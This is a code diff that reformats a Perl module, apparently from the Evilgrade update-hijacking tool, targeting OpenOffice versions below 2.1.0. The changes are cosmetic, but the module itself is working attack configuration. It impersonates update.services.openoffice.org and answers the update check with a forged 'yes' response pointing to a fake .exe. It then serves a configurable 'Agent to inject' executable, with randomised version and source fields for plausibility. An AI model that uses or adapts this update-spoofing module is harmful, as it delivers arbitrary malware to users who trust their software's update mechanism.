@@ -1,3 +1,4 @@
+
 ###############
 # openoffice.pm
 #
@@ -25,51 +26,60 @@ package modules::openoffice;
 use strict;
 use Data::Dump qw(dump);
 
-my $base=
-{
-    'name' => 'openoffice',
-    'version' => '1.0',
-    'appver' => '< 2.1.0',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => '(update.services.openoffice.org|update23.services.openoffice.org)',
+my $base = {
+    'name'        => 'openoffice',
+    'version'     => '1.0',
+    'appver'      => '< 2.1.0',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh' =>
+        '(update.services.openoffice.org|update23.services.openoffice.org)',
     'request' => [
-		    {
-		    'req' => 'ProductUpdateService/check.Update', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '0',
-		    'string' => "yes\$\$\$http://update.services.openoffice.org/openofficeupdate<%RND1%>.exe\$\$\$buildid=<%VERSION%>\nProductPatch=null\nProductSource=<%SOURCE%>\nProductKey=OpenOffice.org <%VERSION%>\nAllLanguages=es\n_OS=Windows\n_ARCH=x86\n",
-		    'parse' => '1',
-		    'file' => '',
-		    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => '0',
-		    'file' => ''
-		    },
+        {   'req' => 'ProductUpdateService/check.Update',    #regex friendly
+            'type'   => 'string',    #file|string|agent|install
+            'method' => '',          #any
+            'bin'    => '0',
+            'string' =>
+                "yes\$\$\$http://update.services.openoffice.org/openofficeupdate<%RND1%>.exe\$\$\$buildid=<%VERSION%>\nProductPatch=null\nProductSource=<%SOURCE%>\nProductKey=OpenOffice.org <%VERSION%>\nAllLanguages=es\n_OS=Windows\n_ARCH=x86\n",
+            'parse' => '1',
+            'file'  => '',
+        },
+        {   'req'    => '.exe',      #regex friendly
+            'type'   => 'agent',     #file|string|agent|install
+            'method' => '',          #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => '0',
+            'file'   => ''
+        },
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                   'version'  => { 'val' => "'9'.isrcore::utils::RndNum(3)",
-                                 'hidden' => 1,
-				'dynamic' =>1,},
-                   'source'  => { 'val' => "'OO'.isrcore::utils::RndAlpha(4)",
-                                 'hidden' => 1,
-				'dynamic' =>1,},				
-                   'rnd1'  => { 'val' => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
-                                 'hidden' => 1,
-				'dynamic' =>1,},
-                                                                                       			    	  
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val'     => "'9'.isrcore::utils::RndNum(3)",
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'source' => {
+            'val'     => "'OO'.isrcore::utils::RndAlpha(4)",
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'    => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
+            'hidden' => 1,
+            'dynamic' => 1,
+        },
+
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
